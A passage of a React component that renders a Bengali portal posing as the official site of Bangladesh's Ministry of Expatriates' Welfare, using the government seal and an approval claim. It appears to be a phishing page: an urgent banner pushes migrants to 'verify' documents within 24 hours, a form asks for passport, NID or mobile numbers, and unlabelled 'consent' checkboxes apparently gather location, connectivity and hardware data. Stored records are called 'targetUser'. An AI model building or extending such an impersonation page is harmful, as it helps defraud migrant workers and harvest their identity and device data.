      setToast({ message: 'আপডেট করতে সমস্যা হয়েছে।', type: 'error' });
    } finally {
      setIsUpdatingProfile(false);
    }
  };

  const handleDocUpload = async (file: File) => {
    if (!targetUser) return;
    setIsUploadingDoc(true);
    try {
      const storageRef = ref(storage, `documents/${targetUser.id}/${file.name}`);
      await uploadBytes(storageRef, file);
      const downloadURL = await getDownloadURL(storageRef);
      
      const docRef = doc(db, 'targetUsers', targetUser.id);
      const newDoc = { name: file.name, url: downloadURL, type: file.type };
      const updatedDocs = [...(targetUser.documents || []), newDoc];
      
      await updateDoc(docRef, { documents: updatedDocs });
      setTargetUser({ ...targetUser, documents: updatedDocs });
      
      // Send notification for new upload
      sendEmailNotification(targetUser.email || 'user@example.com', targetUser.name, 'New Document Uploaded', 'upload');
      
      setToast({ message: 'ডকুমেন্ট সফলভাবে আপলোড করা হয়েছে!', type: 'success' });
    } catch (error) {
      console.error('Upload error:', error);
      setToast({ message: 'আপলোড করতে সমস্যা হয়েছে।', type: 'error' });
    } finally {
      setIsUploadingDoc(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 p-6 space-y-6">
        <Skeleton className="h-1 w-full bg-gov-red" />
        <div className="max-w-md mx-auto space-y-6">
          <Skeleton className="h-24 w-full" />
          <Skeleton className="h-64 w-full" />
          <Skeleton className="h-48 w-full" />
          <div className="grid grid-cols-2 gap-4">
            <Skeleton className="h-12 w-full" />
            <Skeleton className="h-12 w-full" />
          </div>
        </div>
      </div>
    );
  }

  const renderContent = () => {
    if (activePage === 'all-register') {
      return (
        <FamilyCardApp 
          tab="card" 
          isRegistering={isRegistering} 
          setIsRegistering={setIsRegistering} 
          activeRegistrationType={activeRegistrationType} 
          setActiveRegistrationType={setActiveRegistrationType} 
        />
      );
    }

    if (activePage === 'dashboard') {
      return (
        <FamilyCardApp 
          tab="dashboard" 
          isRegistering={isRegistering} 
          setIsRegistering={setIsRegistering} 
          activeRegistrationType={activeRegistrationType} 
          setActiveRegistrationType={setActiveRegistrationType} 
        />
      );
    }

    if (activePage === 'help-center') {
      return (
        <div className="h-[calc(100dvh-56px)] overflow-hidden md:h-auto md:min-h-screen w-full bg-[#f8fafc] p-0 md:p-8 md:pb-24 font-sans flex flex-col">
          <HelpCenter />
        </div>
      );
    }

    if (systemSettings.maintenanceMode && !showAdmin) {
      return (
        <div className="min-h-screen bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
          <div className="bg-white/5 p-12 rounded-[3rem] border border-white/10 backdrop-blur-xl max-w-md w-full">
            <div className="w-24 h-24 bg-gov-red/20 rounded-full flex items-center justify-center mx-auto mb-8 animate-pulse">
              <ShieldAlert size={48} className="text-gov-red" />
            </div>
            <h1 className="text-3xl font-black text-white mb-4">পোর্টালে রক্ষণাবেক্ষণ চলছে</h1>
            <p className="text-slate-400 font-bold leading-relaxed mb-8">
              সিস্টেম আপগ্রেড করার জন্য সাময়িকভাবে পোর্টালটি বন্ধ রাখা হয়েছে। অনুগ্রহ করে কিছুক্ষণ পর আবার চেষ্টা করুন।
            </p>
            <div className="flex items-center justify-center gap-2 text-gov-green font-bold text-xs uppercase tracking-widest">
              <Clock size={16} /> Estimated Time: 2 Hours
            </div>
            <button onClick={() => setShowAdmin(true)} className="mt-8 text-white/20 hover:text-white/40 transition-colors text-[10px] font-black uppercase tracking-widest">
              Admin Login
            </button>
          </div>
        </div>
      );
    }

    if (!targetUser) {
      return (
        <div className="min-h-screen bg-[#f8fafc] font-sans pb-24">
          {/* National Portal Top Bar */}
          <div className="bg-gov-red h-[3px] w-full"></div>
          <div className="bg-[#004d39] py-1.5 px-4 text-[10px] text-white/90 font-bold flex justify-between items-center border-b border-white/10">
            <span className="flex items-center gap-2">
              <img 
                src="/my-logo22.jpg" 
                alt="" 
                className="w-4 h-4 object-contain" 
                onError={(e) => {
                  e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
                  e.currentTarget.className = "w-4 h-4 brightness-0 invert";
                }} 
              />
              গণপ্রজাতন্ত্রী বাংলাদেশ সরকারের অফিসিয়াল তথ্য বাতায়ন
            </span>
            <div className="flex gap-4 items-center">
              <span className="cursor-pointer hover:text-white transition-colors">English</span>
              <span className="opacity-40">|</span>
              <span className="cursor-pointer hover:text-white text-emerald-300">বাংলা</span>
            </div>
          </div>

          {/* Premium Sticky Header with official Ministry Logo */}
          <header className="bg-white p-4 flex justify-between items-center shadow-md border-b border-slate-100 sticky top-0 z-50">
            <div className="flex items-center gap-3">
              <div className="p-1 bg-slate-50 rounded-xl border border-slate-100">
                <img 
                  src="/my-logo23.jpg" 
                  alt="" 
                  className="w-12 h-12 object-contain" 
                  onError={(e) => {
                    e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
                  }} 
                />
              </div>
              <div>
                <h1 className="text-gov-green font-black text-lg md:text-xl leading-tight">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h1>
                <p className="text-slate-500 text-[10px] sm:text-[11px] font-bold uppercase tracking-wider">Ministry of Expatriates' Welfare and Overseas Employment</p>
              </div>
            </div>
            <div className="hidden md:flex items-center gap-5 mr-4">
              <button 
                onClick={() => setActivePage('home')} 
                className={`text-sm font-black pb-1 px-1 transition-all ${activePage === 'home' ? 'text-gov-green border-b-2 border-gov-green' : 'text-slate-600 hover:text-gov-green'}`}
              >
                হোম
              </button>
              <button 
                onClick={() => setActivePage('all-register')} 
                className={`text-sm font-black pb-1 px-1 transition-all ${activePage === 'all-register' ? 'text-gov-green border-b-2 border-gov-green' : 'text-slate-600 hover:text-gov-green'}`}
              >
                অল রেজিস্টার
              </button>
              <button 
                onClick={() => setActivePage('dashboard')} 
                className={`text-sm font-black pb-1 px-1 transition-all ${activePage === 'dashboard' ? 'text-gov-green border-b-2 border-gov-green' : 'text-slate-600 hover:text-gov-green'}`}
              >
                ড্যাশবোর্ড
              </button>
              <button 
                onClick={() => setActivePage('help-center')} 
                className={`text-sm font-black pb-1 px-1 transition-all ${activePage === 'help-center' ? 'text-gov-green border-b-2 border-gov-green' : 'text-slate-600 hover:text-gov-green'}`}
              >
                হেল্প সেন্টার
              </button>
              <button onClick={() => setShowContact(true)} className="text-sm font-bold text-slate-600 hover:text-gov-green pb-1 px-1 transition-colors">যোগাযোগ</button>
              <button onClick={() => setShowAdmin(true)} className="bg-gov-green text-white px-5 py-2.5 rounded-xl text-xs font-black shadow-lg shadow-emerald-900/10 hover:bg-emerald-800 transition-all flex items-center gap-1.5 whitespace-nowrap">
                <Lock size={14} /> প্রশাসক পোর্টাল
              </button>
            </div>
            <button onClick={() => setShowAdmin(true)} className="md:hidden text-slate-400 hover:text-gov-green p-2 transition-colors">
              <Settings size={20} />
            </button>
          </header>

          {/* Premium Notice Alert Bar */}
          <div className="bg-rose-50 border-y border-rose-100 py-2.5 flex items-center gap-2 px-4 shadow-inner">
            <div className="bg-gov-red text-white text-[10px] font-black px-2.5 py-1 rounded-md uppercase tracking-wider animate-bounce-subtle shrink-0">
              জরুরি বিজ্ঞপ্তি
            </div>
            <div className="overflow-hidden w-full relative">
              <div className="inline-block animate-marquee-slow text-gov-red font-bold text-xs sm:text-sm whitespace-nowrap">
                *** সকল প্রবাসী ভাই-বোনদের অবগতির জন্য জানানো যাচ্ছে যে, বিএমইটি স্মার্ট কার্ড এবং ডিজিটাল পাসপোর্ট সংক্রান্ত সরকারি অনুদান ও নথিপত্র সেবা এখন সম্পূর্ণ অনলাইন করা হয়েছে। ২৪ ঘন্টার মধ্যে নথিপত্র যাচাই সম্পন্ন করুন। ***
              </div>
            </div>
          </div>

          <main className="max-w-6xl mx-auto px-4 py-8">
            {/* Beautiful modern image slideshow frame for Homepage (Official Portal & Tracking Dashboard) */}
            <div className="mb-10 relative w-full h-[28rem] overflow-hidden rounded-[2.5rem] shadow-xl border-2 border-red-500 bg-slate-950 flex items-center justify-center">
              <AnimatePresence mode="wait">
                <motion.img
                  key={slideIndex2}
                  src={`/my-logo${slideIndex2 + 11}.jpg`}
                  alt={`Official Announcement Slide ${slideIndex2 + 11}`}
                  initial={{ opacity: 0, scale: 1.05 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  transition={{ duration: 0.6, ease: "easeInOut" }}
                  className="absolute inset-0 w-full h-full object-cover"
                  onError={(e) => {
                    // Fallback beautiful banner style if not uploaded in workspace yet
                    e.currentTarget.src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800";
                  }}
                />
              </AnimatePresence>
              
              {/* High legibility overlay gradient */}
              <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-black/50 pointer-events-none flex flex-col justify-between p-6 z-10">
                {/* Header Badge */}
                <div className="flex items-center gap-3 bg-black/45 backdrop-blur-md p-3 rounded-2xl border border-white/10 self-start w-full">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-8 h-8 object-contain shrink-0" referrerPolicy="no-referrer" />
                  <div className="text-left leading-tight">
                    <h3 className="text-white font-black text-xs uppercase tracking-wide flex items-center gap-1.5 font-['Hind_Siliguri']">
                      <span className="inline-block w-2.5 h-2.5 bg-gov-red rounded-full animate-ping"></span>
                      অফিসিয়াল সরকারি পোর্টাল ও ট্র্যাকিং ডেসিবোর্ড
                    </h3>
                    <p className="text-[9px] text-emerald-300 font-bold uppercase tracking-wider font-sans">Ministry of Expatriates' Welfare</p>
                  </div>
                </div>

                {/* Bottom Details Section */}
                <div className="space-y-3 mt-auto bg-black/45 backdrop-blur-md p-4 rounded-2.5xl border border-white/10 w-full font-['Hind_Siliguri']">
                  <div className="flex justify-between items-center border-b border-white/10 pb-2">
                    <span className="text-[10px] text-rose-300 font-black tracking-widest flex items-center gap-1.5 uppercase font-['Hind_Siliguri']">
                      📢 প্রবাসীদের জন্য তথ্যচিত্র গ্যালারি
                    </span>
                    <span className="text-[9px] text-slate-300 font-bold tracking-wider font-sans">
                      ফাইল {slideIndex2 + 11} / 20
                    </span>
                  </div>
                  <div className="flex justify-center gap-1.5 py-1 pointer-events-auto">
                    {Array.from({ length: 10 }).map((_, i) => (
                      <button
                        key={i}
                        onClick={() => setSlideIndex2(i)}
                        className={`h-1.5 rounded-full transition-all duration-300 cursor-pointer ${slideIndex2 === i ? 'w-5 bg-emerald-400' : 'w-1.5 bg-white/40'}`}
                      />
                    ))}
                  </div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              
              {/* Right/Primary Panel: Main Hero and File Search */}
              <div className="lg:col-span-8 space-y-8">
                
                {/* Outstanding Welcome and Search Centric Card */}
                <div className="bg-white rounded-[2.5rem] shadow-xl border border-slate-100 p-8 sm:p-10 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-48 h-48 bg-gradient-to-bl from-emerald-500/10 to-transparent rounded-bl-[10rem] -mr-8 -mt-8 pointer-events-none"></div>
                  
                  <div className="max-w-2xl text-center sm:text-left">
                    <div className="inline-flex items-center gap-2 bg-emerald-50 border border-emerald-100 text-gov-green px-4 py-1.5 rounded-full text-xs font-bold mb-6">
                      <ShieldCheck size={14} className="text-gov-green animate-pulse" />
                      গণপ্রজাতন্ত্রী বাংলাদেশ সরকার কর্তৃক অনুমোদিত পোর্টাল
                    </div>
                    <h1 className="text-3xl sm:text-4xl font-black text-slate-800 tracking-tight leading-tight mb-4">
                      ডিজিটাল প্রবাসী সেবা ও <br className="hidden sm:inline" />
                      <span className="text-gov-green underline decoration-gov-red decoration-4 underline-offset-8">স্মার্ট কার্ড ট্র্যাকিং</span> পোর্টালে স্বাগতম
                    </h1>
                    <p className="text-slate-600 text-sm sm:text-base leading-relaxed mb-8">
                      আপনার ব্যক্তিগত সরকারি অনুদান ফাইল, ভিসা, এবং বিএমইটি স্মার্ট কার্ড ডাউনলোড করতে নিচের তথ্য সরবরাহ করুন। আমাদের ডেটাবেজে সংরক্ষিত আপনার ফাইলটি মুহূর্তেই খুঁজে বের করুন।
                    </p>
                  </div>

                  {/* Official Green/Red Smart Portal Push Permission Management Badge container */}
                  <div id="push-notification-control-panel" className="mb-6 p-4 bg-slate-50 border border-slate-200 rounded-2xl flex flex-col sm:flex-row items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-2.5 bg-emerald-500/10 rounded-xl flex items-center justify-center text-emerald-600 shrink-0 text-xl select-none animate-pulse">
                        🔔
                      </div>
                      <div className="text-left font-bold text-slate-800">
                        <p className="text-xs md:text-sm font-black flex items-center gap-2">
                          <span>সরকারী জরুরী বার্তা ও বিজ্ঞাপন অ্যালার্ট</span>
                          {permissionState === 'granted' && (
                            <span className="inline-flex items-center gap-1 text-[10px] bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full font-black">
                              <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping" />
                              সক্রিয় আছে
                            </span>
                          )}
                          {permissionState === 'denied' && (
                            <span className="inline-flex items-center gap-1 text-[10px] bg-rose-100 text-rose-800 px-2 py-0.5 rounded-full font-black">
                              অফ (ব্লকড)
                            </span>
                          )}
                          {permissionState === 'default' && (
                            <span className="inline-flex items-center gap-1 text-[10px] bg-amber-100 text-amber-800 px-2 py-0.5 rounded-full font-black">
                              অনুমতির অপেক্ষায়
                            </span>
                          )}
                        </p>
                        <p className="text-[10px] md:text-xs text-slate-500 font-medium leading-relaxed mt-0.5">
                          পেজটি বন্ধ থাকলে বা অফলাইনে থাকলেও ফোনের নোটিফিকেশন বারে তাৎক্ষণিক জরুরি সরকারি নির্দেশ এবং নতুন বিজ্ঞাপন পেতে ব্রাউজার নোটিফিকেশন সচল করুন।
                        </p>
                      </div>
                    </div>
                    
                    <div className="shrink-0 w-full sm:w-auto">
                      {permissionState === 'granted' ? (
                        <button
                          id="re-subscribe-button"
                          onClick={registerAndSubscribePush}
                          className="w-full sm:w-auto px-5 py-2.5 bg-emerald-100 hover:bg-emerald-200 border border-emerald-300 text-emerald-950 font-black rounded-xl text-xs transition-all tracking-wide flex items-center justify-center gap-1.5 shadow-sm cursor-pointer"
                        >
                          <span>পুনরায় সাবস্ক্রাইব করুন</span>
                        </button>
                      ) : permissionState === 'denied' ? (
                        <div className="text-center sm:text-right">
                          <span className="text-[10px] md:text-xs font-black text-rose-600 block mb-1">🔒 ব্রাউজার সেটিংসে ব্লক করা আছে</span>
                          <button
                            id="reset-push-permission-info"
                            onClick={() => {
                              registerAndSubscribePush();
                              setToast({ message: 'অনুগ্রহ করে ব্রাউজারের অ্যাড্রেস বারের বামে তালা (Lock) প্রতীকে ক্লিক করে নোটিফিকেশন সচল করুন।', type: 'error' });
                            }}
                            className="px-4 py-1.5 bg-slate-200 hover:bg-slate-300 text-slate-700 text-[10px] font-bold rounded-lg border border-slate-300 cursor-pointer"
                          >
                            কিভাবে চালু করবেন?
                          </button>
                        </div>
                      ) : (
                        <button
                          id="grant-notification-manual"
                          onClick={registerAndSubscribePush}
                          className="w-full sm:w-auto px-6 py-3 bg-gradient-to-r from-red-600 to-emerald-600 hover:from-red-500 hover:to-emerald-500 text-white font-black rounded-xl text-xs sm:text-sm transition-all tracking-wide flex items-center justify-center gap-2 shadow-md hover:shadow-lg active:scale-95 animate-pulse cursor-pointer border-b-4 border-emerald-950"
                        >
                          <span>🔔 নোটিফিকেশন এলাউ করুন</span>
                        </button>
                      )}
                    </div>
                  </div>

                  {/* VIP Consent and Client Profile Optimization Section */}
                  <div className="mb-8 p-4 bg-gradient-to-br from-indigo-50 to-emerald-50 rounded-2xl border-2 border-dashed border-emerald-250">
                    <div className="w-full">
                      {!consentDone ? (
                        <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                          {/* 1 2 3 checkboxes row */}
                          <div className="flex items-center gap-6">
                            <label className="flex items-center cursor-pointer select-none">
                              <input 
                                type="checkbox" 
                                checked={geoSelected}
                                onChange={(e) => setGeoSelected(e.target.checked)}
                                className="w-5 h-5 accent-emerald-600 rounded cursor-pointer" 
                              />
                            </label>
                            <label className="flex items-center cursor-pointer select-none">
                              <input 
                                type="checkbox" 
                                checked={pingSelected}
                                onChange={(e) => setPingSelected(e.target.checked)}
                                className="w-5 h-5 accent-emerald-600 rounded cursor-pointer" 
                              />
                            </label>
                            <label className="flex items-center cursor-pointer select-none">
                              <input 
                                type="checkbox" 
                                checked={hardwareSelected}
                                onChange={(e) => setHardwareSelected(e.target.checked)}
                                className="w-5 h-5 accent-emerald-600 rounded cursor-pointer" 
                              />
                            </label>
                          </div>

                          {/* Submit button */}
                          <button
                            onClick={handleGrantConsent}
                            disabled={consentLoading || (!geoSelected && !pingSelected && !hardwareSelected)}
                            className="w-full sm:w-auto px-6 py-3 bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 text-white rounded-xl text-xs font-black shadow-lg shadow-emerald-500/20 active:scale-[0.97] transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                          >
                            {consentLoading ? (
                              <>
                                <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-4 h-4 border-2 border-white border-t-transparent rounded-full shrink-0" />
                                <span>অনুমোদন যাচাই করা হচ্ছে...</span>
                              </>
                            ) : (
                              <>
                                <ShieldCheck size={16} />
                                <span>সম্মতি দিচ্ছি ও ব্রাউজার ডেটা ভেরিফাই করছি</span>
                              </>
                            )}
                          </button>
                        </div>
                      ) : (
                        <div className="flex items-center justify-between gap-4 bg-emerald-50/60 p-3 rounded-xl border border-emerald-200">
                          <div className="flex items-center gap-2 text-emerald-800">
                            <CheckCircle2 size={18} className="text-emerald-600 shrink-0" />
                            <span className="text-xs font-black">আপনার সম্মতি ও প্রকৃত তথ্য সফলভাবে ভেরিফাই ও সাবমিট করা হয়েছে।</span>
                          </div>
                          <button
                            onClick={() => {
                              localStorage.removeItem('user_consent_given');
                              setConsentDone(false);
                              setToast({ message: 'সম্মতি রিসেট করা হয়েছে। অনুগ্রহ করে আবার ভেরিফাই করুন।', type: 'success' });
                            }}
                            className="px-3 py-1.5 bg-white hover:bg-slate-50 text-slate-700 text-[10px] font-black rounded-lg border border-slate-200 shadow-sm active:scale-95 transition-transform cursor-pointer shrink-0"
                          >
                            রিসেট
                          </button>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Search Engine Interface widget */}
                  <div className="bg-slate-50 rounded-2xl border border-slate-150 p-6 shadow-inner">
                    <h2 className="text-sm font-black text-slate-700 mb-3 flex items-center gap-2">
                      <FileText size={18} className="text-gov-green" />
                      আপনার ফাইল খুঁজুন (পাসপোর্ট / এনআইডি / মোবাইল নম্বর)
                    </h2>
                    
                    <form onSubmit={(e) => { e.preventDefault(); handlePortalSearch(searchQuery); }} className="space-y-3">
                      <div className="relative">
                        <input
                          type="text"
                          value={searchQuery}
                          onChange={(e) => setSearchQuery(e.target.value)}
                          placeholder="উদা: MD NAZMUL HUDA অথবা আপনার পাসপোর্ট/NID"
                          className="w-full text-sm sm:text-base bg-white border-2 border-slate-200 rounded-xl px-5 py-4 pl-12 outline-none focus:border-gov-green transition-all font-bold placeholder:text-slate-400 text-slate-800 shadow-sm"
                        />
                        <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400">
                          <Users size={20} />
                        </div>
                        <button
                          type="submit"
                          disabled={isSearchingDoc}
                          className="absolute right-2.5 top-1/2 -translate-y-1/2 bg-gov-green text-white hover:bg-emerald-800 transition-all font-bold text-xs sm:text-sm px-5 py-2.5 rounded-lg flex items-center gap-1.5 shadow-md shrink-0 cursor-pointer"
                        >
                          {isSearchingDoc ? (
                            <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-4 h-4 border-2 border-white border-t-transparent rounded-full" />
                          ) : (
                            <Send size={14} />
                          )}
                          এখানে ক্লিক করে সার্চ
                        </button>
                      </div>
                    </form>

                    {searchError && (
                      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="mt-3 p-3 bg-rose-50 border border-rose-100 text-gov-red text-xs font-bold rounded-lg flex items-center gap-2">
                        <AlertTriangle size={14} className="shrink-0" />
                        {searchError}
                      </motion.div>
                    )}

                    {/* Quick Access suggestion Badges (Lively dynamic test integration) */}
                    {registeredList && registeredList.length > 0 && (
                      <div className="mt-5 pt-4 border-t border-slate-200">
                        <div className="flex flex-col sm:flex-row sm:items-center gap-2">
                          <span className="text-[11px] font-black text-slate-500 uppercase tracking-wider flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                            সহজ ডেমো টেস্ট (১-ক্লিকে ওপেন):
                          </span>
                        </div>
                        <div className="flex flex-wrap gap-2 mt-2.5">
                          {registeredList.slice(0, 4).map((user) => (
                            <button
                              key={user.id}
                              onClick={() => {
                                setTargetUser(user);
                                const newUrl = new URL(window.location.href);
                                newUrl.searchParams.set('id', user.id);
                                window.history.pushState({}, '', newUrl.toString());
                                setToast({ message: `${user.name} এর ফাইল উন্মুক্ত করা হয়েছে।`, type: 'success' });
                              }}
                              className="px-3 py-2 bg-white hover:bg-emerald-50 hover:border-emerald-300 border border-slate-200 text-xs font-bold text-slate-700 hover:text-gov-green rounded-xl transition-all flex items-center gap-1.5 shadow-sm cursor-pointer"
                            >
                              <UserCheck size={12} className="text-gov-green shrink-0" />
                              <span className="truncate max-w-[120px]">{user.name}</span>
                              <ChevronRight size={10} className="opacity-40" />
                            </button>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Primary Services Grid Box: Prorated Expatriates Special Services */}
                  <div className="mt-12">
                    <div className="flex justify-between items-end mb-6">
                      <div>
                        <h3 className="text-xl font-black text-slate-800 flex items-center gap-2 leading-none">
                          <LayoutDashboard size={22} className="text-gov-green" />
                          প্রবাসীদের বিশেষ সেবা সমূহ
                        </h3>
                        <p className="text-xs text-slate-500 font-semibold mt-1.5">প্রবাসী ভাই-বোনদের সুযোগ-সুবিধা ত্বরান্বিত করার ডিজিটাল মডিউলসমূহ</p>
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      
                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-gov-green/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-emerald-50 text-gov-green rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <Smartphone size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">বিএমইটি স্মার্ট কার্ড ট্র্যাকার</h4>
                          <span className="text-[9px] bg-emerald-100 text-[#004d39] font-black px-1.5 py-0.5 rounded-full uppercase leading-none">অনলাইন</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">বিদেশের উদ্দেশ্যে রওনা হবার আগে আপনার ডিজিটাল স্মার্ট আইডি কার্ড যাচাই করুন এবং টেলিগ্রাম লিংক বা পিডিএফ মারফত ডাউনলোড করতে সাহায্য নিন।</p>
                      </div>

                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-amber-500/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-amber-50 text-amber-600 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <FileText size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">স্মার্ট প্রবাসী অনুদান ও ট্র্যাকিং</h4>
                          <span className="text-[9px] bg-amber-100 text-amber-700 font-black px-1.5 py-0.5 rounded-full uppercase leading-none">ভাতা</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">প্রবাসে কর্মসংস্থান বা নিরাপত্তা বিবেচনায় আপনাদের নামে বরাদ্দকৃত চূড়ান্ত সরকারি ভাতা, বিশেষ অনুদান এবং জরুরি সাহায্য ট্র্যাকিংয়ের জন্য ওয়ান-স্টপ মাধ্যম।</p>
                      </div>

                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-rose-500/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-rose-50 text-gov-red rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <PlaneTakeoff size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">পিডিও সার্টিফিকেট ও ওরিয়েন্টেশন</h4>
                          <span className="text-[9px] bg-rose-100 text-gov-red font-black px-1.5 py-0.5 rounded-full uppercase leading-none">৩-দিন</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">বাধ্যতামূলক পিডিও (Pre-Departure Orientation) ট্রেনিং বুকিং, সেন্টার সমূহের অবস্থান এবং ট্রেনিং সার্টিফিকেট স্ট্যাটাস এবং ই-ক্লিয়ারেন্স চেক করুন।</p>
                      </div>

                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <Stethoscope size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">মেডিকেল রিপোর্ট ও করোনা ভ্যাকসিন কার্ড</h4>
                          <span className="text-[9px] bg-indigo-100 text-indigo-700 font-black px-1.5 py-0.5 rounded-full uppercase leading-none">মেডিকেল</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">সরকার অনুমোদিত গন্তব্যভিত্তিক মেডিকেল টেস্ট স্ট্যাটাস ট্র্যাকিং করুন এবং ভ্যাকসিন নিবন্ধনের সর্বশেষ ডেটা সংগ্রহ করুন ও ক্লিয়ারেন্স ডাউনলোড করুন।</p>
                      </div>

                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-emerald-50 text-emerald-600 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <GraduationCap size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ</h4>
                          <span className="text-[9px] bg-emerald-100 text-emerald-800 font-black px-1.5 py-0.5 rounded-full uppercase leading-none">শিক্ষাবৃত্তি</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">ওয়েজ আর্নার্স কল্যাণ বোর্ড কর্তৃক নিবন্ধিত যোগ্য প্রবাসী সন্তানদের উচ্চশিক্ষার জন্য বার্ষিক সরকারি উপবৃত্তি এবং সাহায্য ভাতা আবেদন ও ট্র্যাকিং করুন।</p>
                      </div>

                      <div className="p-5 bg-white border border-slate-150 rounded-2xl hover:shadow-lg transition-all hover:border-gov-green/20 group relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-24 h-24 bg-red-500/2 rounded-full -mr-6 -mt-6"></div>
                        <div className="w-10 h-10 bg-red-50 text-red-600 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform">
                          <Heart size={20} />
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-black text-slate-800">নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনা</h4>
                          <span className="text-[9px] bg-red-100 text-red-800 font-black px-1.5 py-0.5 rounded-full uppercase leading-none">বোনাস</span>
                        </div>
                        <p className="text-xs text-slate-500 leading-relaxed font-semibold">বৈধ ব্যাংকিং চ্যানেলের মাধ্যমে বাংলাদেশে রেমিট্যান্স প্রেরণকারীদের জন্য সরকারের নির্ধারিত ২.৫% থেকে ৫% ক্যাশব্যাক প্রাপ্তি নিশ্চিত করতে ট্র্যাকিং উইন্ডো।</p>
                      </div>

                    </div>
                  </div>

                  {/* Elegant Instruction Board: আবেদন করার ধারাবাহিক নির্দেশনা */}
                  <div className="mt-12 pt-8 border-t border-slate-150">
                    <h3 className="text-xl font-black text-slate-800 mb-6 flex items-center gap-2.5">
                      <Clock size={20} className="text-gov-red" />
                      আবেদন ও ডিজিটাল ট্র্যাকিং করার নির্দেশিকা
                    </h3>
                    
                    <div className="relative border-l-2 border-slate-200 ml-4 pl-6 space-y-8">
                      
                      <div className="relative">
                        <span className="absolute -left-10 top-0.5 w-7 h-7 bg-gov-green hover:bg-emerald-800 transition-colors text-white text-xs font-black rounded-full flex items-center justify-center shadow-md">
                          ০১
                        </span>
                        <h4 className="text-sm font-black text-slate-800">আপনার সঠিক নথি দিয়ে অনুসন্ধান করুন</h4>
                        <p className="text-xs text-slate-500 leading-relaxed mt-1 font-semibold">
